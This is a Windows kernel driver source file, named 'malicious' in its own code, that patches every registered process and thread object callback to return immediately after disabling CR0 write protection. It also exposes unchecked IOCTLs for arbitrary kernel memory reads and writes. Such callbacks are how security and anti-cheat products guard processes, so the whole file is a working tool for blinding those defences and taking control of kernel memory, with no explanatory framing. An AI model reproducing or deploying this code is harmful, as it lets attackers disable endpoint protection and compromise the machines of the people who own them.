#include <intrin.h.>
#include <ntifs.h>
#include <wdm.h>
#include <ntddk.h>

BOOLEAN EnumProcessObCallback();
BOOLEAN EnumThreadObCallback();
NTSTATUS RemoveObCallback(PVOID RegistrationHandle);

#define SYMLINK_NAME L"\\??\\malicious"
#define DEVICE_NAME L"\\device\\malicious"
#define IOCTL_MEMORY_READ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MEMORY_WRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

PDEVICE_OBJECT pMyDevice;
UNICODE_STRING DeviceName;
UNICODE_STRING SymLinkName;

struct MALICIOUS_MEMORY_READ
{
    DWORD64 Address;
    DWORD64 Value;
};
static_assert(sizeof(MALICIOUS_MEMORY_READ) == 16, "sizeof MALICIOUS_MEMORY_READ must be 12 bytes");

struct MALICIOUS_MEMORY_WRITE
{
    DWORD64 Address;
    DWORD64 Value;
};
static_assert(sizeof(MALICIOUS_MEMORY_WRITE) == 16, "sizeof MALICIOUS_MEMORY_WRITE must be 12 bytes");

typedef struct _OBJECT_TYPE_INITIALIZER
{
    USHORT Length;                      // Uint2B
    UCHAR ObjectTypeFlags;              // UChar
    ULONG ObjectTypeCode;               // Uint4B
    ULONG InvalidAttributes;            // Uint4B
    GENERIC_MAPPING GenericMapping;     // _GENERIC_MAPPING
    ULONG ValidAccessMask;              // Uint4B
    ULONG RetainAccess;                 // Uint4B
    POOL_TYPE PoolType;                 // _POOL_TYPE
    ULONG DefaultPagedPoolCharge;       // Uint4B
    ULONG DefaultNonPagedPoolCharge;    // Uint4B
    PVOID DumpProcedure;                // Ptr64     void
    PVOID OpenProcedure;                // Ptr64     long
    PVOID CloseProcedure;               // Ptr64     void
    PVOID DeleteProcedure;              // Ptr64     void
    PVOID ParseProcedure;               // Ptr64     long
    PVOID SecurityProcedure;            // Ptr64     long
    PVOID QueryNameProcedure;           // Ptr64     long
    PVOID OkayToCloseProcedure;         // Ptr64     unsigned char
#if (NTDDI_VERSION >= NTDDI_WINBLUE)    // Win8.1
    ULONG WaitObjectFlagMask;           // Uint4B
    USHORT WaitObjectFlagOffset;        // Uint2B
    USHORT WaitObjectPointerOffset;     // Uint2B
#endif
} OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;

typedef struct _OBJECT_TYPE
{
    LIST_ENTRY TypeList;                 // _LIST_ENTRY
    UNICODE_STRING Name;                 // _UNICODE_STRING
    PVOID DefaultObject;                 // Ptr64 Void
    UCHAR Index;                         // UChar
    ULONG TotalNumberOfObjects;          // Uint4B
    ULONG TotalNumberOfHandles;          // Uint4B
    ULONG HighWaterNumberOfObjects;      // Uint4B
    ULONG HighWaterNumberOfHandles;      // Uint4B
    OBJECT_TYPE_INITIALIZER TypeInfo;    // _OBJECT_TYPE_INITIALIZER
    EX_PUSH_LOCK TypeLock;               // _EX_PUSH_LOCK
    ULONG Key;                           // Uint4B
    LIST_ENTRY CallbackList;             // _LIST_ENTRY
} OBJECT_TYPE, *POBJECT_TYPE;

#pragma pack(1)
typedef struct _OB_CALLBACK
{
    LIST_ENTRY ListEntry;
    ULONGLONG Unknown;
    HANDLE ObHandle;
    PVOID ObTypeAddr;
    PVOID PreCall;
    PVOID PostCall;
} OB_CALLBACK, *POB_CALLBACK;
#pragma pack()


VOID ShowError(PCHAR lpszText, NTSTATUS ntStatus)
{
    DbgPrint("%s Error[0x%X]\n", lpszText, ntStatus);
}

KIRQL WPOFFx64()
{
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    UINT64 cr0 = __readcr0();
    cr0 &= 0xfffffffffffeffff;
    __writecr0(cr0);
    _disable();
    return irql;
}

void WPONx64(KIRQL irql)
{
    UINT64 cr0 = __readcr0();
    cr0 |= 0x10000;
    _enable();
    __writecr0(cr0);
    KeLowerIrql(irql);
}

NTSTATUS RemoveObCallback(PVOID RegistrationHandle)
{
    ObUnRegisterCallbacks(RegistrationHandle);

    return STATUS_SUCCESS;
}

VOID PatchedObcallbacks(PVOID Address)
{
    KIRQL irql;
    CHAR patchCode[] = "\x33\xC0\xC3";    // xor eax,eax + ret
    if (!Address)
        return;
    if (MmIsAddressValid(Address))
    {
        irql = WPOFFx64();
        memcpy(Address, patchCode, 3);
        WPONx64(irql);
    }
}

//¦CÁ| callback (process)
BOOLEAN EnumProcessObCallback()
{
    POB_CALLBACK pObCallback = NULL;

    LIST_ENTRY CallbackList = ((POBJECT_TYPE)(*PsProcessType))->CallbackList;

    pObCallback = (POB_CALLBACK)CallbackList.Flink;
    do
    {
        if (FALSE == MmIsAddressValid(pObCallback))
        {
            break;
        }
        if (NULL != pObCallback->ObHandle)
        {
            DbgPrint("[PsProcessType]pObCallback->ObHandle = 0x%p\n", pObCallback->ObHandle);
            DbgPrint("[PsProcessType]pObCallback->PreCall = 0x%p\n", pObCallback->PreCall);
            DbgPrint("[PsProcessType]pObCallback->PostCall = 0x%p\n", pObCallback->PostCall);
            PatchedObcallbacks(pObCallback->PreCall);
            PatchedObcallbacks(pObCallback->PostCall);
            DbgPrint("[Patch] pObCallback->PreCall= 0x%p  Success\n", pObCallback->PreCall);
        }
        pObCallback = (POB_CALLBACK)pObCallback->ListEntry.Flink;

    } while (CallbackList.Flink != (PLIST_ENTRY)pObCallback);

    return TRUE;
}

BOOLEAN EnumThreadObCallback()
{
    POB_CALLBACK pObCallback = NULL;

    LIST_ENTRY CallbackList = ((POBJECT_TYPE)(*PsThreadType))->CallbackList;
    pObCallback = (POB_CALLBACK)CallbackList.Flink;
    do
    {
        if (FALSE == MmIsAddressValid(pObCallback))
        {
            break;
        }
        if (NULL != pObCallback->ObHandle)
        {
            DbgPrint("[PsThreadype]pObCallback->ObHandle = 0x%p\n", pObCallback->ObHandle);
            DbgPrint("[PsThreadType]pObCallback->PreCall = 0x%p\n", pObCallback->PreCall);
            DbgPrint("[PsThreadType]pObCallback->PostCall = 0x%p\n", pObCallback->PostCall);
            PatchedObcallbacks(pObCallback->PreCall);
            PatchedObcallbacks(pObCallback->PostCall);
            DbgPrint("[Remove] pObCallback->PreCall= 0x%p  Success\n", pObCallback->PreCall);
        }
        pObCallback = (POB_CALLBACK)pObCallback->ListEntry.Flink;

    } while (CallbackList.Flink != (PLIST_ENTRY)pObCallback);

    return TRUE;
}

NTSTATUS MyDispatcher(PDEVICE_OBJECT device_object, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;
    ULONG inputBufferSize = 0;
    ULONG outputBufferSize = 0;
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION irp_stack = IoGetCurrentIrpStackLocation(irp);
    if (device_object != pMyDevice)
    {
        status = STATUS_UNSUCCESSFUL;
        return status;
    }
    switch (irp_stack->MajorFunction)
    {
        case IRP_MJ_DEVICE_CONTROL:
            inputBufferSize = irp_stack->Parameters.DeviceIoControl.InputBufferLength;
            outputBufferSize = irp_stack->Parameters.DeviceIoControl.OutputBufferLength;
            IoControlCode = irp_stack->Parameters.DeviceIoControl.IoControlCode;
            MALICIOUS_MEMORY_READ* malicious_memory_read;
            MALICIOUS_MEMORY_WRITE* malicious_memory_write;
            switch (IoControlCode)
            {
                case IOCTL_MEMORY_READ:
                    malicious_memory_read = (MALICIOUS_MEMORY_READ*)irp->AssociatedIrp.SystemBuffer;
                    malicious_memory_read->Value = *(DWORD32*)malicious_memory_read->Address;
                    break;
                case IOCTL_MEMORY_WRITE:
                    malicious_memory_write = (MALICIOUS_MEMORY_WRITE*)irp->AssociatedIrp.SystemBuffer;
                    *(DWORD32*)malicious_memory_write->Address = (DWORD32)malicious_memory_write->Value;
                    break;
                default:
                    break;
            }
            break;
        case IRP_MJ_CREATE:
            break;
        case IRP_MJ_CLOSE:
            break;
        case IRP_MJ_READ:
            break;
        case IRP_MJ_WRITE:
            break;
        default:
            break;
    }
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = outputBufferSize;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS MyCreateDevice(PDRIVER_OBJECT driver_object)
{
    NTSTATUS status;
    RtlInitUnicodeString(&DeviceName, DEVICE_NAME);
    RtlInitUnicodeString(&SymLinkName, SYMLINK_NAME);
    status = IoCreateDevice(driver_object, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, 1, &pMyDevice);
    if (NT_SUCCESS(status))
    {
        driver_object->DeviceObject = pMyDevice;
        status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
        if (NT_SUCCESS(status))
        {
            return status;
        }
    }
    return status;
}

void DriverUnload(PDRIVER_OBJECT db)
{
    IoDeleteSymbolicLink(&SymLinkName);
    IoDeleteDevice(db->DeviceObject);
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status = STATUS_SUCCESS;
    status = MyCreateDevice(driver_object);
    driver_object->DriverUnload = DriverUnload;
    for (ULONG i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
    {
        driver_object->MajorFunction[i] = MyDispatcher;
    }

    EnumProcessObCallback();
    EnumThreadObCallback();
    return status;
}
